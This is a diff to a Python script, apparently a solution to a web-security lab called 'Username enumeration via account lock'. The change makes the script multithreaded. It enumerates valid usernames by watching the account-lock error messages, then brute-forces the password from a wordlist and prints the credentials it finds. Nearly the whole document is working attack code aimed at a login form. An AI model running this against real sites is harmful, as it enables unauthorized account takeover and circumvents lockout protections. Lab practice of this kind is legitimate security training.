@@ -1,78 +1,102 @@
+import threading
 import requests
 import sys
-import os
 import getopt
-
-
-def clear_screen():
-  if os.name == 'posix':
-    os.system('clear')
-  else:
-    os.system('cls')
+from halo import Halo
 
 
 def get_username(url, session):
   usernames = open("./usernames.txt", "r")
+  valid_username = []
+  threads = []
 
-  for username in usernames:
+  def test_username(username, number):
     username = username.strip()
+    data = {'username': username, 'password': number}
+    response = session.post(url, data=data)
+
+    if "Invalid username or password." in response.text:
+      pass
+    else:
+      valid_username.append(username)
+  
+  for username in usernames:
     for i in range(5):
-      data = {'username': username, 'password':  i}
-      response = session.post(url, data=data)
+      t = threading.Thread(target=test_username, args=(username, i))
+      threads.append(t)
 
-      if "Invalid username or password." in response.text:
-        clear_screen()
-        print(f"[!] Testing username: \"{username}\"")
-      else:
-        valid_username = username
-        usernames.close()
-        return valid_username  
+  for x in threads:
+    x.start() 
 
+  for x in threads:
+    x.join()
+  
+  return valid_username[0]
 
 def get_password(url, session, valid_username):
   passwords = open("./passwords.txt", "r")
   error_messages = ["You have made too many incorrect login attempts. Please try again in 1 minute(s).", "Invalid username or password."]
+  valid_password = []
+  threads = []
 
-  for password in passwords:
+  def test_password(password):
     password = password.strip()
     data = {'username': valid_username, 'password':  password}
     response = session.post(url, data=data)
-    clear_screen()
-    print(f"[*] The username is: \"{valid_username}\"\n[!] Testing password \"{password}\"")
 
     if (error_messages[0] not in response.text) and (error_messages[1] not in response.text):
-      valid_password = password
-      passwords.close()
-      return valid_password      
+      valid_password.append(password)
+
+  for password in passwords:
+    t = threading.Thread(target=test_password, args=(password,))
+    threads.append(t)
+
+  for x in threads:
+    x.start() 
+
+  for x in threads:
+    x.join()
+
+  return valid_password[0]
 
 def main(argv):
+  help_message = "This is the script for:\n'Username enumeration via account lock'\n\nUsage: python3 auth-5.py -u <url>/login"
+
   try:
     opts, args = getopt.getopt(argv, "hu:")
   except getopt.GetoptError:
-    print("This is the script for:\n'Username enumeration via account lock'\n\nUsage: python3 auth-5.py -u <url>/login")
-    print("\x1b[?25h")
+    print(help_message)
+    print("\x1b[?25h") # Make cursor visible
     sys.exit(2)
 
   for opt, arg in opts:
     if opt == "-u":
       url = arg
     elif opt == "-h":
-      print("This is the script for:\n'Username enumeration via account lock'\n\nUsage: python3 auth-5.py -u <url>/login")
-      print("\x1b[?25h")
+      print(help_message)
+      print("\x1b[?25h") # Make cursor visible
       sys.exit()
 
   session = requests.Session()
-  username = get_username(url, session)
-  password = get_password(url, session, username)
-  clear_screen()
   
-  print(f"Wait 1 minute and enter these credentials:\n[*] The username is: \"{username}\"\n[*] The password is: \"{password}\"")
+  # Create and start spinner animation
+  spinner = Halo(text='Testing usernames...', spinner='bouncingBar')
+  spinner.start()
+  # Get valid username
+  username = get_username(url, session)
+  # Finish spinner
+  spinner.succeed(f"The username is: \"{username}\"")
 
+  # Create and start spinner animation
+  spinner = Halo(text='Testing passwords...', spinner='bouncingBar')
+  spinner.start()
+  # Get valid password
+  password = get_password(url, session, username)
+  # Finish spinner
+  spinner.succeed(f"The password is: \"{password}\"")
 
 if __name__ == "__main__":
-  # Hide Cursor
-  print("\x1b[?25l")
+  print("\x1b[?25l", end="") # Hide cursor
   main(sys.argv[1:])
-  # Make cursor visible
-  print("\x1b[?25h")
+  print("\x1b[?25h", end="") # Make cursor visible
   sys.exit()
